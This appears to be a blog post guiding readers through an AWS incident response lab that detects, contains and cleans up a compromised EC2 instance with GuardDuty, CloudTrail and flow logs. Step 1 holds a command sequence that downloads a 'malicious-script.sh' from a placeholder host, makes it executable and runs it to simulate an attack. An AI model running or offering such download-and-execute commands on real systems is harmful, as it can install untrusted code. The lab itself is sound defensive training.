## layout: post

title: "AWS Incident Response Lab Guide: Detect and Mitigate Compromised EC2"  
description: "A hands-on lab to practice AWS incident response skills by detecting, investigating, and mitigating a compromised EC2 instance."  
tags: [aws, security, incident-response, devops, cloud-security]  
series: "Security Engineering Labs"

# AWS Incident Response Lab Guide: Detect and Mitigate a Compromised EC2 Instance

**Tags:** #aws #security #incident-response #devops #cloud-security  
**Series:** *Security Engineering Labs*

---

## 🎯 **Lab Objective**

Simulate detecting and responding to a compromised EC2 instance using AWS tools like **GuardDuty, CloudTrail, VPC Flow Logs, and Security Hub**. This lab is designed for security engineers, DevOps teams, and cloud practitioners looking to sharpen their incident response skills in AWS.

---

## 📚 **Prerequisites**

Before starting, ensure you have:

- An **AWS account** (use the [AWS Free Tier](https://aws.amazon.com/free/) or [AWS Educate](https://aws.amazon.com/education/awseducate/) for sandbox environments).
- **AWS CLI** installed and configured.
- Basic familiarity with:
  - EC2, VPC, IAM, and GuardDuty.
  - Linux commands and Bash scripting.

---

## 🛠️ **Lab Environment Setup**

### Enable AWS Services

1. **Enable CloudTrail**:
  - Go to **AWS CloudTrail > Create trail**.
  - Name your trail (e.g., `security-lab-trail`).
  - Apply it to all management events.
2. **Enable VPC Flow Logs**:
  - Go to **VPC > Your VPCs > Select VPC > Actions > Create flow log**.
  - Set destination to **CloudWatch Logs** or **S3**.
3. **Enable GuardDuty**:
  - Go to **GuardDuty > Get Started**.
  - Enable GuardDuty in your desired region.
4. **Launch an EC2 Instance**:
  - Use **Amazon Linux 2** or **Ubuntu**.
  - Attach a **public IP** (for simulation purposes).
  - Open **SSH (port 22)** in the security group.

---

## 🔍 **Step 1: Simulate a Threat**

### Trigger a GuardDuty Alert

SSH into your EC2 instance and run a **malicious script** to simulate an attack:

```bash
# Connect to your instance
ssh -i your-key.pem ec2-user@<public-ip>

# Simulate malware execution (e.g., crypto-mining)
wget https://example.com/malicious-script.sh
chmod +x malicious-script.sh
./malicious-script.sh
```

**Note:** This is for simulation only. In a real environment, avoid running untrusted scripts.

---

## 🕵️ **Step 2: Investigate the Alert**

### A. Review GuardDuty Findings

1. Navigate to **AWS GuardDuty > Findings**.
2. Look for an alert related to your EC2 instance (e.g., `UnauthorizedAccess:EC2/SSHBruteForce` or `Trojan:EC2/BlackholeTraffic`).

### B. Analyze CloudTrail Logs

1. Go to **AWS CloudTrail > Event history**.
2. Filter for events related to your EC2 instance (`i-1234567890abcdef0`).
  - Search for:
    - `RunInstances` (unauthorized instance launch).
    - `CreateUser` (unauthorized user creation).
    - `CreateSnapshot` (unauthorized snapshot creation).
3. Export logs for analysis:
  ```bash
   aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=i-1234567890abcdef0 --query 'events[*].{eventTime:eventTime, eventName:eventName, username:username}' --output table
  ```

### C. Check VPC Flow Logs

1. Go to **VPC > Flow Logs**.
2. Filter for the network interface (`eni-xxxxxxxxxxxxx`) of your EC2 instance.
3. Look for:
  - Unusual outbound traffic (e.g., to known malicious IPs).
  - Large data transfers.

---

## 🚨 **Step 3: Contain the Threat**

### A. Isolate the Instance

1. **Stop the EC2 instance**:
  ```bash
   aws ec2 stop-instances --instance-ids i-1234567890abcdef0
  ```
2. **Detach the EBS volume**:
  ```bash
   aws ec2 detach-volume --volume-id vol-xxxxxxxxxxxxxxxx
  ```
3. **Create a forensic snapshot**:
  ```bash
   aws ec2 create-snapshot --volume-id vol-xxxxxxxxxxxxxxxx --description "Forensic snapshot"
  ```

### B. Update Security Groups and NACLs

1. **Revoke all inbound/outbound traffic** for the instance’s security group.
2. **Apply a restrictive NACL** to the subnet:
  - Go to **VPC > Network ACLs > Edit inbound/outbound rules** to deny all traffic except your IP.

---

## ✂️ **Step 4: Eradicate the Threat**

### A. Terminate the Instance

```bash
aws ec2 terminate-instances --instance-ids i-1234567890abcdef0
```

### B. Remove Malicious Artifacts

1. **Delete the malicious script**:
  ```bash
   rm -f /path/to/malicious-script.sh
  ```
2. **Check for unauthorized users**:
  ```bash
   cat /etc/passwd  # Look for suspicious users
   sudo userdel suspicious-user
  ```
3. **Remove cron jobs or startup scripts**:
  ```bash
   crontab -l
   sudo rm -f /etc/cron.d/malicious-cron
  ```

### C. Rotate Credentials

1. **Rotate IAM user keys** for any affected accounts.
2. **Revoke temporary credentials** (if using AWS STS):
  ```bash
   aws sts get-caller-identity  # Check active sessions
  ```

---

## 📝 **Step 5: Document Your Findings**

Create a **report** with the following sections. Use Markdown for clarity:

### **1. Alert Summary**


| **Field**         | **Details**                            |
| ----------------- | -------------------------------------- |
| GuardDuty Finding | `UnauthorizedAccess:EC2/SSHBruteForce` |
| Severity          | High                                   |
| Timestamp         | 2026-03-24T12:00:00Z                   |


### **2. Timeline of Events**


| **Timestamp**        | **Event**                         | **Source**    |
| -------------------- | --------------------------------- | ------------- |
| 2026-03-24T11:55:00Z | Malicious script executed         | EC2 instance  |
| 2026-03-24T11:56:00Z | GuardDuty alert triggered         | AWS GuardDuty |
| 2026-03-24T11:58:00Z | Unusual outbound traffic detected | VPC Flow Logs |


### **3. Containment Actions**

- Stopped instance `i-1234567890abcdef0`.
- Detached and snapshotted EBS volume `vol-xxxxxxxxxxxxxxxx`.
- Updated security group to block all traffic.

### **4. Eradication Actions**

- Terminated instance.
- Deleted `/path/to/malicious-script.sh`.
- Removed unauthorized user `suspicious-user`.

### **5. Recommendations**

- **Patch Management**: Ensure EC2 instances are up-to-date.
- **Least Privilege**: Limit SSH access to trusted IPs.
- **Monitoring**: Set up CloudWatch Alarms for unusual activity.

---

## 📊 **Deliverables**

1. **Screenshot**: GuardDuty finding (PNG/JPG).
2. **CloudTrail Snippet**: JSON export of the event.
3. **Lab Report**: Markdown/PDF (as shown above).
4. **Cleanup Script**: Automation for future use (example below).

### **Example Cleanup Script (Bash)**

```bash
#!/bin/bash
# Automate containment and eradication steps

INSTANCE_ID="i-1234567890abcdef0"
VOLUME_ID="vol-xxxxxxxxxxxxxxxx"

# Stop instance
aws ec2 stop-instances --instance-ids $INSTANCE_ID

# Detach volume
aws ec2 detach-volume --volume-id $VOLUME_ID

# Create snapshot
aws ec2 create-snapshot --volume-id $VOLUME_ID --description "Forensic snapshot"

# Terminate instance
aws ec2 terminate-instances --instance-ids $INSTANCE_ID

echo "Cleanup completed!"
```

---

## 🏆 **Evaluation Criteria**


| **Criteria**              | **Score** |
| ------------------------- | --------- |
| Detection Accuracy        | 20        |
| Log Analysis Depth        | 20        |
| Containment Effectiveness | 20        |
| Eradication Completeness  | 20        |
| Documentation Quality     | 20        |


---

## 🔗 **Resources and Further Reading**

- [AWS GuardDuty Documentation](https://docs.aws.amazon.com/guardduty/)
- [NIST SP 800-61r3: Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r3.pdf)
- [AWS Security Incident Response Guide](https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/aws-security-incident-response-guide.html)

---

## 🎉 **Next Steps**

- **Try another scenario**: Simulate a **S3 bucket breach** or **Lambda privilege escalation**.
- **Automate with AWS Lambda**: Write a Lambda function to auto-contain threats.
- **Share your experience**: Tweet your results with `#AWSIncidentResponse`!

---

**Have questions or feedback?** Drop a comment below or connect with me on [LinkedIn](https://linkedin.com/in/yourprofile)!
